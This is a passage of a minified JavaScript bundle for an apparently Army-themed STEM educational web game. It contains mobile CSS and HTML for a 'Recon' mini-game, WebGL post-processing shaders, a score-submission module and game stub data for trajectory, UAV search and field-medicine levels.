#recon-map-canvas div.gmnoprint[title="Secure Network"] img,#recon-map-canvas div.gmnoprint[title="You"] img ,#recon-map-canvas div.gmnoprint[title="Potential Threat"] img {\n		display:none;\n	}\n	/* compensate for iPhone and Android devices with high DPI, add iPad media query */\n	@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (device-width: 768px) {\n		#recon-map-canvas div.gmnoprint[title="Secure Network"], #recon-map-canvas div.gmnoprint[title="You"] , #recon-map-canvas div.gmnoprint[title="Potential Threat"] {\n			margin:-13px 0 0 -13px;\n		}\n	}\n\n\n	/* some help for really small mobile views */\n	@media screen and (max-width: 320px) {\n		.recon-title {\n			font-size:2.5em;\n			text-transform: uppercase;\n			opacity:.8;\n			width: 100%; \n			text-align: center; \n			letter-spacing: .4em;\n			padding-left: .4em;\n			margin-top:15px;\n		}\n\n		.recon-text{\n			font-size:16px;\n			opacity:.8;\n			margin-top:15px;\n			line-height:1.1em;\n			padding-left:5%;\n			padding-right:5%;\n			text-align: center; \n		}\n\n\n		.recon-button-circle {\n			width:85px;\n			height:85px;\n			line-height:78px;\n			font-size:18px;\n			text-transform: uppercase;\n			text-align: center;\n			border:1px solid #fff;\n			border-radius:50%;\n			cursor:pointer;\n			transition: all 1s;\n			opacity:0;\n		}\n\n\n		#recon-start-button {\n\n			margin-left: -42.5px;\n		}\n\n		#recon-restart-button{\n			position: absolute;\n			bottom:50px;\n			left:50%;\n	    	margin-left: -42.5px;\n	    	opacity:1;\n	    	font-size:16px;\n	    	line-height:20px;\n			padding-top: 21px;\n			border:1px solid orange;\n		}\n\n		#recon-view-intel-button{\n			position: absolute;\n			bottom:50px;\n			left:50%;\n	    	margin-left: -50px;\n	    	opacity:1;\n	    	font-size:16px;\n	    	line-height:20px;\n			padding-top: 21px;\n			border:1px solid orange;\n		}\n\n\n	}\n\n\n	\n\n\n	/* some help for landscape orietnation for views */\n	@media screen and (orientation:landscape) and (min-height: 320px){\n		\n		.recon-small-title {\n		    position: relative;\n		    font-size:1em;\n		    opacity:.7;\n		    letter-spacing: .3em;\n		    text-transform: uppercase;\n		    overflow: hidden;\n		    cursor: default;\n		    -webkit-user-select: none;\n		    -moz-user-select: none;\n		    -ms-user-select: none;\n		    user-select: none;\n			margin-top:3em;\n		}\n\n		.recon-title {\n			font-size:3.25em;\n			text-transform: uppercase;\n			opacity:.8;\n			width: 100%; \n			text-align: center; \n			letter-spacing: .4em;\n			padding-left: .4em;\n			margin-top:10px;\n		}\n	\n		.recon-text{\n			font-size:11px;\n			line-height:16px;\n			margin-top:5px;\n			padding-left:3%; padding-right:3%;\n		}\n\n		#recon-start-button{\n			bottom:20px;\n	    	margin-left: -55px;\n	    	\n		}\n\n		.recon-welcome .recon-text {font-size:15px!important;}\n		.recon-mission-passed .recon-text {font-size:16px!important;}\n		.recon-mission-failed .recon-text {font-size:16px!important;}\n		\n	/*	\n\n		.recon-message.show{\n			bottom:20px;\n		}\n\n		\n		.recon-button-circle {\n			width:85px;\n			height:85px;\n			line-height:78px;\n			font-size:18px;\n			text-transform: uppercase;\n			text-align: center;\n			border:1px solid #fff;\n			border-radius:50%;\n			cursor:pointer;\n			transition: all 1s;\n			opacity:0;\n		}\n\n\n		#recon-start-button{\n			bottom:20px;\n	    	margin-left: -42.5px;\n	    	\n		}\n\n\n\n		#recon-restart-button{\n			position: absolute;\n			bottom:10px;\n			left:50%;\n	    	margin-left: -42.5px;\n	    	opacity:1;\n	    	font-size:16px;\n	    	line-height:20px;\n			padding-top: 21px;\n			border:1px solid orange;\n		}\n\n		#recon-view-intel-button{\n			position: absolute;\n			bottom:10px;\n			left:50%;\n	    	margin-left: -42.5px;\n	    	opacity:1;\n	    	font-size:16px;\n	    	line-height:20px;\n			padding-top: 21px;\n			border:1px solid orange;\n		}\n		*/\n\n	}\n\n\n\n	@media screen and (orientation:landscape)  and (max-height: 320px) {\n\n		.recon-small-title { font-size:12px;margin-top:7em; }\n		.recon-title { font-size:30px; margin-top:0px;}\n		.recon-text {font-size:.6em!important;margin-top:0px; font-size:10px;line-height:10px;opacity:.8; padding-left:3%; padding-right:3%;}\n		.recon-mission-failed .recon-text {font-size:.9em!important;}\n	}</style><div class="recon-welcome recon-view"><div class=bg></div><div class=recon-small-title>The Mission</div><div class=recon-title>Recon</div><div class=recon-text>Reach the secure wi-fi network and solve the access lock to retrieve important intel. Beware of red roaming threats that will attempt to jam your signal.</div><div class=recon-message>Scanning for secure networks...</div><div id=recon-start-button class=recon-button-circle>Begin</div></div><div class="recon-map recon-view"><div id=recon-map-canvas></div><div class=recon-header-backer></div><div class=recon-map-message><div class=recon-map-message-icon><img class=flag src="assets/imgs/mobile-recon/flag.png"></div><div class=recon-map-message-text></div></div></div><div class="recon-game recon-view"><div class=bg></div><div class=recon-game-text>Solve the key to gain access.</div><div class=recon-game-canvas></div></div><div class="recon-mission-failed recon-view"><div class=bg></div><div class=recon-small-title>Recon</div><div class=recon-title>Failed</div><div class=recon-text>You have failed your mission. To locate another secure network near you press the button below.</div><div id=recon-restart-button class=recon-button-circle>Restart<br>Mission</div></div><div class="recon-mission-passed recon-view"><div class=bg></div><div class=recon-small-title>Recon</div><div class=recon-title>Completed</div><div class=recon-text>Congrats. You have unlocked some key intel. Access this intel below to complete the mission.</div><div class=recon-view-intel><div class=recon-view-folder><img src="assets/imgs/mobile-recon/viewIntel_2.png"></div><div id=recon-view-intel-button class=recon-button-circle>View<br>Intel</div></div></div><div class=recon-timer-text></div>';
},{}],140:[function(require,module,exports){
var namespaceString="Army";window[namespaceString]=window[namespaceString]||{},module.exports=window[namespaceString];
},{}],141:[function(require,module,exports){
var CDN_PATH="./assets/",paths={CDN:CDN_PATH,VIDEOS:CDN_PATH+"videos/",IMGS:CDN_PATH+"imgs/",IMGS_STANDARD:CDN_PATH+"imgs/standard/",MODELS:CDN_PATH+"models/",INTEL_SWEEP:CDN_PATH+"data/intel-sweep/"};module.exports=paths;
},{}],142:[function(require,module,exports){
var Backbone=require("backbone"),user=require("shared/user"),storage=require("shared/utils/storage"),submitToAPI=function(e,o){console.log("submission",e),$.post("/api/score",e,function(e){"function"==typeof o&&o(e)})},scoreInterface=new(Backbone.Model.extend({initialize:function(){},send:function(e,o){console.log("scoreInterface.send",e,user),user.get("logged_in")||(e.created_on=Date.now(),storage.setItem("score_"+e.game_id,JSON.stringify(e))),submitToAPI(e,function(n){console.log("server got score",n),n.skill=e.skill,n.speed=e.speed,n.accuracy=e.accuracy,o(n)})}}));("dev"===window.env||null!==window.location.search.match("debug"))&&(window._score=scoreInterface),module.exports=scoreInterface;
},{"backbone":2,"shared/user":213,"shared/utils/storage":223}],143:[function(require,module,exports){
var BarrelBlurShader={uniforms:{tDiffuse:{type:"t",value:null},amount:{type:"f",value:.5},time:{type:"f",value:0}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform sampler2D tDiffuse;","uniform float amount;","uniform float time;","varying vec2 vUv;","const int num_iter = 16;","const float reci_num_iter_f = 1.0 / float(num_iter);","const float gamma = 2.2;","const float MAX_DIST_PX = 200.0;","vec2 barrelDistortion( vec2 p, vec2 amt )","{","    p = 2.0*p-1.0;","    //float BarrelPower = 1.125;","    const float maxBarrelPower = 3.0;","    float theta  = atan(p.y, p.x);","    float radius = length(p);","    radius = pow(radius, 1.0 + maxBarrelPower * amt.x);","    p.x = radius * cos(theta);","    p.y = radius * sin(theta);","    return 0.5 * ( p + 1.0 );","}","float sat( float t )","{","	return clamp( t, 0.0, 1.0 );","}","float linterp( float t ) {","	return sat( 1.0 - abs( 2.0*t - 1.0 ) );","}","float remap( float t, float a, float b ) {","	return sat( (t - a) / (b - a) );","}","vec3 spectrum_offset( float t ) {","	vec3 ret;","	float lo = step(t,0.5);","	float hi = 1.0-lo;","	float w = linterp( remap( t, 1.0/6.0, 5.0/6.0 ) );","	ret = vec3(lo,1.0,hi) * vec3(1.0-w, w, 1.0-w);","","	return pow( ret, vec3(1.0/2.2) );","}","float nrand( vec2 n )","{","	return fract(sin(dot(n.xy, vec2(12.9898, 78.233)))* 43758.5453);","}","vec3 lin2srgb( vec3 c )","{","    return pow( c, vec3(gamma) );","}","vec3 srgb2lin( vec3 c )","{","    return pow( c, vec3(1.0/gamma));","}","void main() {","vec2 uv = vUv;","vec2 max_distort = vec2(amount);","vec2 oversiz = barrelDistortion( vec2(1,1), max_distort );","uv = 2.0 * uv - 1.0;","uv = uv / (oversiz*oversiz);","uv = 0.5 * uv + 0.5;","vec3 sumcol = vec3(0.0);","vec3 sumw = vec3(0.0);","float rnd = nrand( uv + fract(time) );","for ( int i=0; i<num_iter;++i ){","float t = (float(i)+rnd) * reci_num_iter_f;","vec3 w = spectrum_offset( t );","sumw += w;","sumcol += w * srgb2lin(texture2D( tDiffuse, barrelDistortion(uv, max_distort*t ) ).rgb);","}","sumcol.rgb /= sumw;","vec3 outcol = lin2srgb(sumcol.rgb);","outcol += rnd/255.0;","gl_FragColor = vec4( outcol, 1.0);","}"].join("\n")};module.exports=BarrelBlurShader;
},{}],144:[function(require,module,exports){
DotMaterialShader={uniforms:{lineTime:{type:"f",value:1},segmentsX:{type:"f",value:40},segmentsY:{type:"f",value:40},dotSize:{type:"f",value:.3},lineSize:{type:"f",value:.1},blur:{type:"f",value:.05}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float lineTime;","uniform float noiseTime;","uniform float segmentsX;","uniform float segmentsY;","uniform float dotSize;","uniform float lineSize;","uniform float blur;","varying vec2 vUv;","varying float vNoiseDisp;","void main() {","vec2 p = vUv;","p.y += lineTime;","vec2 nearest = vec2(2.0*fract(segmentsX * p.x) - 1.0, 2.0*fract(segmentsY * p.y) - 1.0);","float dist = length(nearest);","vec3 dotcol =  vec3(1.0 - smoothstep(dotSize, dotSize + dotSize*blur, dist));","gl_FragColor = vec4(dotcol, 1.0);","}"].join("\n")},module.exports=DotMaterialShader;
},{}],145:[function(require,module,exports){
FadeMaterialShader={uniforms:{nearDist:{type:"f",value:1e3},farDist:{type:"f",value:3e3}},vertexShader:["void main() {","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float nearDist;","uniform float farDist;","uniform float doFade;","void main() {","vec4 col = vec4(0,0,0,1);","float distanceToCamera = 1.0 / gl_FragCoord.w;","col.a = 1.0 - smoothstep(nearDist , farDist ,distanceToCamera);","gl_FragColor = col ;","}"].join("\n")},module.exports=FadeMaterialShader;
},{}],146:[function(require,module,exports){
THREE.FilmShader={uniforms:{tDiffuse:{type:"t",value:null},time:{type:"f",value:0},nIntensity:{type:"f",value:.5},sIntensity:{type:"f",value:.05},sCount:{type:"f",value:4096},grayscale:{type:"i",value:1}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float time;","uniform bool grayscale;","uniform float nIntensity;","uniform float sIntensity;","uniform float sCount;","uniform sampler2D tDiffuse;","varying vec2 vUv;","void main() {","vec4 cTextureScreen = texture2D( tDiffuse, vUv );","float x = vUv.x * vUv.y * time *  1000.0;","x = mod( x, 13.0 ) * mod( x, 123.0 );","float dx = mod( x, 0.01 );","vec3 cResult = cTextureScreen.rgb + cTextureScreen.rgb * clamp( 0.1 + dx * 100.0, 0.0, 1.0 );","vec2 sc = vec2( sin( vUv.y * sCount ), cos( vUv.y * sCount ) );","cResult += cTextureScreen.rgb * vec3( sc.x, sc.y, sc.x ) * sIntensity;","cResult = cTextureScreen.rgb + clamp( nIntensity, 0.0,1.0 ) * ( cResult - cTextureScreen.rgb );","gl_FragColor =  vec4( cResult, cTextureScreen.a );","}"].join("\n")};
},{}],147:[function(require,module,exports){
var GlowShader={uniforms:{tDiffuse:{type:"t",value:null},amount:{type:"f",value:.5},size:{type:"f",value:4},darkness:{type:"f",value:.1},resolution:{type:"v2",value:new THREE.Vector2(800,600)}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform sampler2D tDiffuse;","uniform float size;","uniform float amount;","uniform vec2 resolution;","uniform float darkness;","varying vec2 vUv;","void main() {","float h = size / resolution.x;","float v = size / resolution.y;","vec4 sum = vec4( 0.0 );","sum += (texture2D( tDiffuse, vec2( vUv.x - 4.0 * h, vUv.y ) )- darkness) * 0.051 ;","sum += (texture2D( tDiffuse, vec2( vUv.x - 3.0 * h, vUv.y ) )- darkness) * 0.0918;","sum += (texture2D( tDiffuse, vec2( vUv.x - 2.0 * h, vUv.y ) )- darkness) * 0.12245;","sum += (texture2D( tDiffuse, vec2( vUv.x - 1.0 * h, vUv.y ) )- darkness) * 0.1531;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y ) )- darkness) * 0.1633;","sum += (texture2D( tDiffuse, vec2( vUv.x + 1.0 * h, vUv.y ) )- darkness) * 0.1531;","sum += (texture2D( tDiffuse, vec2( vUv.x + 2.0 * h, vUv.y ) )- darkness) * 0.12245;","sum += (texture2D( tDiffuse, vec2( vUv.x + 3.0 * h, vUv.y ) )- darkness) * 0.0918;","sum += (texture2D( tDiffuse, vec2( vUv.x + 4.0 * h, vUv.y ) )- darkness) * 0.051;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y - 4.0 * v ) )- darkness) * 0.051;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y - 3.0 * v ) )- darkness) * 0.0918;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y - 2.0 * v ) )- darkness) * 0.12245;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y - 1.0 * v ) )- darkness) * 0.1531;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y ) )- darkness) * 0.1633;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y + 1.0 * v ) )- darkness) * 0.1531;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y + 2.0 * v ) )- darkness) * 0.12245;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y + 3.0 * v ) )- darkness) * 0.0918;","sum += (texture2D( tDiffuse, vec2( vUv.x, vUv.y + 4.0 * v ) )- darkness) * 0.051;","vec4 base = texture2D( tDiffuse, vUv );","gl_FragColor = base + max(sum,0.0) * amount;","}"].join("\n")};module.exports=GlowShader;
},{}],148:[function(require,module,exports){
var LinesShader={uniforms:{tDiffuse:{type:"t",value:null},lineStrength:{type:"f",value:10},lineSize:{type:"f",value:10},lineTilt:{type:"f",value:10}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform sampler2D tDiffuse;","uniform float lineStrength;","uniform float lineSize;","uniform float lineTilt;","varying vec2 vUv;","void main() {","vec4 col = texture2D(tDiffuse, vUv);","col += sin(vUv.x*lineSize*(1.0-lineTilt)+vUv.y*lineSize*lineTilt)*lineStrength;","gl_FragColor = col;","}"].join("\n")};module.exports=LinesShader;
},{}],149:[function(require,module,exports){
RadialBlurShader={uniforms:{tDiffuse:{type:"t",value:null},strength:{type:"f",value:.999},expo:{type:"f",value:1.1},center:{type:"v2",value:new THREE.Vector2(.5,.5)}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float strength;","uniform float expo;","const float steps = 40.0;","uniform sampler2D tDiffuse;","uniform vec2 center;","varying vec2 vUv;","void main() {","if (expo == 0.0){","gl_FragColor = texture2D( tDiffuse, vUv );","}else{","vec2 s = vUv;","vec3 total = vec3(0.0);","vec2 d = (center-vUv)/steps;","float w = 1.0;","for( int i=0; i< int(steps); i++ ) {","vec3 res = texture2D( tDiffuse, s).xyz;","res = smoothstep(0.0,1.0,res);","total += w*res;","w *= strength;","s += d;","}","total /= steps;","vec3 dif = texture2D( tDiffuse, vUv).xyz;","gl_FragColor = vec4( mix(total*expo, dif*2.0, 0.5), 1.0);","}","}"].join("\n")},module.exports=RadialBlurShader;
},{}],150:[function(require,module,exports){
var RipplesShader={uniforms:{noiseTime:{type:"f",value:1},noiseSize:{type:"f",value:2},lineTime:{type:"f",value:1},lineCount:{type:"f",value:40},dotSize:{type:"f",value:.3},lineSize:{type:"f",value:.1},blur:{type:"f",value:.05},depth:{type:"f",value:300}},vertexShader:["varying vec2 vUv;","varying float vNoiseDisp;","uniform float noiseTime;","uniform float noiseSize;","uniform float depth;","vec3 mod289(vec3 x) {","return x - floor(x * (1.0 / 289.0)) * 289.0;","}","vec2 mod289(vec2 x) {","return x - floor(x * (1.0 / 289.0)) * 289.0;","}","vec3 permute(vec3 x) {","return mod289(((x*34.0)+1.0)*x);","}","float snoise(vec2 v) {","const vec4 C = vec4(0.211324865405187,","				  0.366025403784439,","				 -0.577350269189626,","				  0.024390243902439);","vec2 i  = floor(v + dot(v, C.yy) );","vec2 x0 = v -   i + dot(i, C.xx);","vec2 i1;","i1 = (x0.x > x0.y) ? vec2(1.0, 0.0) : vec2(0.0, 1.0);","vec4 x12 = x0.xyxy + C.xxzz;","x12.xy -= i1;","i = mod289(i); // Avoid truncation effects in permutation","vec3 p = permute( permute( i.y + vec3(0.0, i1.y, 1.0 ))","	+ i.x + vec3(0.0, i1.x, 1.0 ));","vec3 m = max(0.5 - vec3(dot(x0,x0), dot(x12.xy,x12.xy), dot(x12.zw,x12.zw)), 0.0);","m = m*m ;","m = m*m ;","vec3 x = 2.0 * fract(p * C.www) - 1.0;","vec3 h = abs(x) - 0.5;","vec3 ox = floor(x + 0.5);","vec3 a0 = x - ox;","m *= 1.79284291400159 - 0.85373472095314 * ( a0*a0 + h*h );","vec3 g;","g.x  = a0.x  * x0.x  + h.x  * x0.y;","g.yz = a0.yz * x12.xz + h.yz * x12.yw;","return 130.0 * dot(m, g);","}","void main() {","vUv = uv;","vNoiseDisp = snoise(vUv*noiseSize + noiseTime) ;","vec3 newPosition = position + normal * vNoiseDisp *depth;","gl_Position = projectionMatrix * modelViewMatrix * vec4( newPosition, 1.0 );","}"].join("\n"),fragmentShader:["const vec3 black = vec3(0.0, 0.0, 0.0);","uniform float lineTime;","uniform float noiseTime;","uniform float lineCount;","uniform float dotSize;","uniform float lineSize;","uniform float blur;","varying vec2 vUv;","varying float vNoiseDisp;","vec3 hsv2rgb(vec3 c){","vec4 K = vec4(1.0, 2.0 / 3.0, 1.0 / 3.0, 3.0);","vec3 p = abs(fract(c.xxx + K.xyz) * 6.0 - K.www);","return c.z * mix(K.xxx, clamp(p - K.xxx, 0.0, 1.0), c.y);","}","void main() {","vec2 p = vUv;","p.y += lineTime;","vec2 nearest = 2.0*fract(lineCount * p) - 1.0;","float dist = length(nearest);","vec3 dotcol =  vec3(1.0 - smoothstep(dotSize, dotSize + dotSize*blur, dist));","float x = fract(p.y * lineCount) - .5 + lineSize/2.;","float f = smoothstep(-lineSize*blur,0.0, x) - smoothstep(lineSize, lineSize + lineSize*blur, x);","vec3 linecol = vec3(f);","vec3 fragcol = (linecol + dotcol )* -vNoiseDisp ;","gl_FragColor = vec4(fragcol, 1.0);","}"].join("\n")};module.exports=RipplesShader;
},{}],151:[function(require,module,exports){
var paths=require("shared/paths"),VIDEO_PATH=paths.VIDEOS,stub={mission:{chapters:[{story_video:VIDEO_PATH+"STEM-i01",story_title_card:"assets/imgs/tmp/story/INT-01-placeholder.jpg",game:{title:"Trajectory Mapping",slug:"0_trajectory_mapping"}},{story_video:VIDEO_PATH+"STEM-i02",story_title_card:"assets/imgs/tmp/story/INT-02-placeholder.jpg",game:{title:"UAV Search",slug:"1_uav_search"}},{story_video:VIDEO_PATH+"STEM-i03",story_title_card:"assets/imgs/tmp/story/INT-03-placeholder.jpg",game:{title:"Clear Path",slug:"2_clear_path"}},{story_video:VIDEO_PATH+"STEM-i04",story_title_card:"assets/imgs/tmp/story/INT-04-placeholder.jpg",game:{title:"Field Medicine",slug:"3_field_medicine"}},{story_video:VIDEO_PATH+"STEM-i05",story_title_card:"assets/imgs/tmp/story/INT-05-placeholder.jpg",game:{title:"Intel Sweep",slug:"4_intel_sweep"}},{story_video:VIDEO_PATH+"STEM-i06",story_title_card:"assets/imgs/tmp/story/INT-06-placeholder.jpg",game:{title:"Security Bypass",slug:"5_security_bypass"}},{story_video:VIDEO_PATH+"STEM-i07",story_title_card:"assets/imgs/tmp/story/INT-07-placeholder.jpg",game:{title:"Access Intel",slug:"6_access_intel"}}]},"training-room":{games:[{title:"Trajectory Mapping",slug:"0_trajectory_mapping"},{title:"UAV Search",slug:"1_uav_search"},{title:"Clear Path",slug:"2_clear_path"},{title:"Field Medicine",slug:"3_field_medicine"},{title:"Security Bypass",slug:"5_security_bypass"}]},games:{"0_trajectory_mapping":{config:{slug:"0_trajectory_mapping",title:"Trajectory Mapping",description:"Watch the payload fall towards earth and click to select the location where you think it will land. Or, calculate the trajectory with the provided X, Y, Z intel. Once you have placed the target on the globe, click Deploy to send your troops.",description_device:"Watch the payload fall towards earth and tap to select the location where you think it will land. Then tap Deploy to send your troops to the impact location.",stem_breakdown:{science:40,technology:10,engineering:20,math:30},instructions:{description:""}},versions:{hard:[{height_after_60:55,mass_of_rocket:8e4,force_of_rocket:2600,time_of_explosion:14378724e5,location_of_explosion:{x:100,y:100,z:12022.60242},heading_after_explosion:{x:10,y:5,z:63.83556678},surface_area:37.69911184,to_solve:["mass_combined","mass_payload","heading_after_explosion","velocity_after_explosion","speed_after_explosion","drag_coefficient","terminal_velocity","time_to_terminal_velocity","altitude_at_terminal_velocity","time_from_terminal_velocity_to_impact","time_of_impact","location_of_impact","lat_long_of_impact"]}],medium:[],easy:[]}},"1_uav_search":{config:{slug:"1_uav_search",title:"UAV Search",description:"Deploy your UAVs to capture imagery of the terrain, while avoiding the jamming threats or running out of fuel. Analyze the captured imagery to find the 4 impact sites, then Submit them to HQ.",stem_breakdown:{science:15,technology:20,engineering:60,math:5},instructions:{description:""}},versions:{hard:[{uav_fuel:1e3,uav_speed:2,uav_count:5,enemies:[{location:"1_3"},{location:"5_6"},{location:"8_10"},{location:"13_20"},{location:"20_3"},{location:"1_20"}],"suspicious-images":[{location:"5_5"},{location:"5_6"},{location:"5_7"},{location:"6_5"},{location:"6_6"},{location:"6_7"},{location:"7_5"},{location:"7_6"},{location:"7_7"},{location:"2_22"},{location:"2_23"},{location:"2_24"},{location:"3_22"},{location:"3_23"},{location:"3_24"},{location:"4_22"},{location:"4_23"},{location:"4_24"},{location:"12_12"},{location:"12_13"},{location:"12_14"},{location:"13_12"},{location:"13_13"},{location:"13_14"},{location:"14_12"},{location:"14_13"},{location:"14_14"}],hills:[{location:"18_15"},{location:"18_16"},{location:"18_17"},{location:"18_18"},{location:"18_19"},{location:"18_20"},{location:"19_15"},{location:"19_16"},{location:"19_17"},{location:"19_18"},{location:"19_19"},{location:"19_20"}]}],medium:[],easy:[]}},"2_clear_path":require("./stubs/clear_path/clear_path"),"3_field_medicine":{config:{slug:"3_field_medicine",title:"Field Medicine",description:"Triage the most critical injuries as quickly as possible. Apply the correct treatments to injuries, bringing all patients into stable condition. If a patient dies you fail the level.",stem_breakdown:{science:70,technology:10,engineering:20,math:0},instructions:{description:""},ailments:{arm_laceration:{id:"arm_laceration",title:"Arm Laceration",primary_treatments:["sutures"],secondary_treatments:["bandage","tourniquet","pain_medicine","apply_pressure"],damage:.1,heartrate_modifier:15,position3d:{x:-.458,y:.158,z:-.101},position2d:{x:191,y:817},body_section:1},upper_leg_laceration:{id:"upper_leg_laceration",title:"Upper-Leg Laceration",primary_treatments:["sutures"],secondary_treatments:["bandage","tourniquet","pain_medicine","apply_pressure"],damage:.1,heartrate_modifier:15,position3d:{x:.201,y:-.346,z:-.04},position2d:{x:348,y:1458},body_section:2},abdominal_laceration:{id:"abdominal_laceration",title:"Abdominal Laceration",primary_treatments:["saline_lock","apply_pressure"],secondary_treatments:["bandage","pain_medicine"],damage:.2,heartrate_modifier:30,position3d:{x:.097,y:.336,z:.146},position2d:{x:508,y:981},body_section:1},head_contusion:{id:"head_contusion",title:"Head Contusion",primary_treatments:["nasal_trumpet"],secondary_treatments:["pain_medicine"],damage:.25,heartrate_modifier:0,position3d:{x:.057,y:1.414,z:-.141},position2d:{x:444,y:170},body_section:0},lower_leg_amputation:{id:"lower_leg_amputation",title:"Lower-Leg Amputation",primary_treatments:["tourniquet"],secondary_treatments:["bandage","pain_medicine","apply_pressure"],damage:.5,heartrate_modifier:40,position3d:{x:-.122,y:-.697,z:-.076},position2d:{x:380,y:1712},amputated:!0,body_section:2},pulmonary_contusion:{id:"pulmonary_contusion",title:"Pulmonary Contusion",primary_treatments:["chest_decompression"],secondary_treatments:["pain_medicine"],damage:.3,heartrate_modifier:10,position3d:{x:-.094,y:.725,z:.017},position2d:{x:585,y:731},body_section:1},open_chest_wound:{id:"open_chest_wound",title:"Open Chest Wound",primary_treatments:["chest_decompression","combat_gauze"],secondary_treatments:["bandage","pain_medicine"],damage:.25,heartrate_modifier:25,position3d:{x:.111,y:.67,z:.091},position2d:{x:372,y:673},body_section:1},fractured_leg:{id:"fractured_leg",title:"Fractured Leg",primary_treatments:["splint"],secondary_treatments:["pain_medicine"],damage:.1,heartrate_modifier:0,position3d:{x:.185,y:-.958,z:-.096},position2d:{x:597,y:1602},body_section:2},crushed_pelvis:{id:"crushed_pelvis",title:"Crushed Pelvis",primary_treatments:["pelvic_binder"],secondary_treatments:["pain_medicine"],damage:.35,heartrate_modifier:-20,position3d:{x:-.143,y:.111,z:-.007},position2d:{x:350,y:1097},body_section:1},finger_amputation:{id:"finger_amputation",title:"Finger Amputation",primary_treatments:["tourniquet"],secondary_treatments:["splint","pain_medicine"],damage:.3,heartrate_modifier:25,position3d:{x:.455,y:-.231,z:-.028},position2d:{x:152,y:1441},body_section:1},forehead_contusion:{id:"forehead_contusion",title:"Forehead Contusion",primary_treatments:["bandage"],secondary_treatments:["pain_medicine","irrigate_wound"],damage:.2,heartrate_modifier:0,position3d:{x:-.058,y:1.406,z:.042},position2d:{x:509,y:210},body_section:0},lower_leg_laceration:{id:"lower_leg_laceration",title:"Lower-Leg Laceration",primary_treatments:["sutures"],secondary_treatments:["bandage","tourniquet","pain_medicine"],damage:.1,heartrate_modifier:0,position3d:{x:.175,y:-1.287,z:-.147},position2d:{x:585,y:1872},body_section:2},"3rd_degree_burn_neck":{id:"3rd_degree_burn_neck",title:"3rd Degree Burn - Neck",primary_treatments:["burn_dressing"],secondary_treatments:["irrigate_wound","initiate_iv_therapy","pain_medicine"],damage:.15,heartrate_modifier:20,position3d:{x:.119,y:1.153,z:-.147},position2d:{x:498,y:440},body_section:0},"3rd_degree_burn_upper_leg":{id:"3rd_degree_burn_upper_leg",title:"3rd Degree Burn - Upper Leg",primary_treatments:["burn_dressing"],secondary_treatments:["irrigate_wound","initiate_iv_therapy","pain_medicine"],damage:.1,heartrate_modifier:20,position3d:{x:-.197,y:-.208,z:-.025},position2d:{x:627,y:1371},body_section:1},shrapnel_in_abdomen:{id:"shrapnel_in_abdomen",title:"Shrapnel In Abdomen",primary_treatments:["sutures"],secondary_treatments:["irrigate_wound","debris_removal","pain_medicine"],damage:.3,heartrate_modifier:20,position3d:{x:-.069,y:.252,z:.123},position2d:{x:405,y:940},body_section:1},shrapnel_in_leg:{id:"shrapnel_in_leg",title:"Shrapnel In Leg",primary_treatments:["sutures"],secondary_treatments:["irrigate_wound","debris_removal","pain_medicine"],damage:.2,heartrate_modifier:15,position3d:{x:-.16,y:-.497,z:-.051},position2d:{x:331,y:1335},body_section:2},fractured_arm:{id:"fractured_arm",title:"Fractured Arm",primary_treatments:["splint"],secondary_treatments:["pain_medicine"],damage:.1,heartrate_modifier:15,position3d:{x:.472,y:.234,z:-.147},position2d:{x:786,y:1063},body_section:1},neck_hemmorage:{id:"neck_hemmorage",title:"Neck Hemmorage",primary_treatments:["combat_gauze"],secondary_treatments:[],damage:.2,heartrate_modifier:15,position3d:{x:-.047,y:1.153,z:-.081},position2d:{x:440,y:468},body_section:0},abdominal_hemmorage:{id:"abdominal_hemmorage",title:"Abdominal Hemmorage",primary_treatments:["combat_gauze"],secondary_treatments:[],damage:.15,heartrate_modifier:12,position3d:{x:-.042,y:.379,z:.088},position2d:{x:438,y:1014},body_section:1},basal_skull_fracture:{id:"basal_skull_fracture",title:"Basal Skull Fracture",primary_treatments:["nasal_trumpet"],secondary_treatments:[],damage:.2,heartrate_modifier:0,position3d:{x:.083,y:1.406,z:-.001},position2d:{x:396,y:242},body_section:0},crushed_knee:{id:"crushed_knee",title:"Crushed Knee",primary_treatments:["splint"],secondary_treatments:["pain_medicine"],damage:.1,heartrate_modifier:0,position3d:{x:.165,y:-.689,z:-.096},position2d:{x:578,y:1725},body_section:2}},treatments:{bandage:{id:"bandage",title:"Bandage",time_to_administer:2e3,time_scalar:.05},sutures:{id:"sutures",title:"Sutures",time_to_administer:4e3,time_scalar:.1},tourniquet:{id:"tourniquet",title:"Tourniquet",time_to_administer:2e3,time_scalar:.05},saline_lock:{id:"saline_lock",title:"Saline Lock",time_to_administer:4e3,time_scalar:.15},nasal_trumpet:{id:"nasal_trumpet",title:"Nasal Trumpet",time_to_administer:4e3,time_scalar:.2},chest_decompression:{id:"chest_decompression",title:"Chest Decompression",time_to_administer:4e3,time_scalar:.3},hare_traction_splint:{id:"hare_traction_splint",title:"Hare Traction 